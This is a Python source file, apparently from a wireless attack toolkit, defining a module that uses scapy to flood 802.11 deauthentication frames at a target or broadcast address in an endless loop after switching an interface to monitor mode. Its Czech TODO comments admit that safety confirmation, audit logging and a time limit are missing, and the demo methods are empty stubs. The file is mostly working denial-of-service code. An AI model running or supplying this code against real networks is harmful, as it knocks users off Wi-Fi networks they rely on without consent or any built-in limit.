from tty import CC

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from core.monitor_mode import MonitorMode

# TODO:
# - přidat bezpečnostní potvrzení
# - přidat audit log
# - přidat časový limit
# - přidat ochranu proti omylu - jak proti omylu? tady není místo na omyl XD


class DeauthModule:
    def __init__(self):
        self.target_mac = "ff:ff:ff:ff:ff:ff"
        self.ap_mac = None
        self.interface = None
        self.state = "STOPPED"
        ...
        pass


    def select_target(self, target_mac="ff:ff:ff:ff:ff:ff", ap_mac="AA:BB:CC:DD:EE:FF", interface="wlan0"):
        self.target_mac = target_mac
        self.ap_mac = ap_mac
        self.interface = interface
        self.monitor = MonitorMode(interface=self.interface)
        """
        Výběr cíle
        """
    def start(self):
        if self.state == "RUNNING":
            print("Modul is already running.")
            return
        self.monitor.enable()

        self.state = "RUNNING"

        while self.state == "RUNNING":
            packet = (RadioTap() /
                     Dot11(type=0, subtype=12, addr1=self.target_mac, addr2=self.ap_mac, addr3=self.ap_mac) /
                     Dot11Deauth(reason=1)
            )
            sendp(packet, iface=self.interface, count=1, inter=0.1)

    def stop(self):
        if self.state == "STOPPED":
            print("Modul is already stopped.")
            return
        self.state = "STOPPED"
        self.monitor.disable()
        """
        Ukončení
        """
    def start_demo(self):
        ...
        """
        Spuštění demonstrační části
        """


    def stop_demo(self):
        ...
        """
        Ukončení
        """
if __name__ == "__main__":
    deauth_module = DeauthModule()
    deauth_module.select_target(target_mac="AA:BB:CC:DD:EE:FF", ap_mac="AA:BB:CC:DD:EE:FF")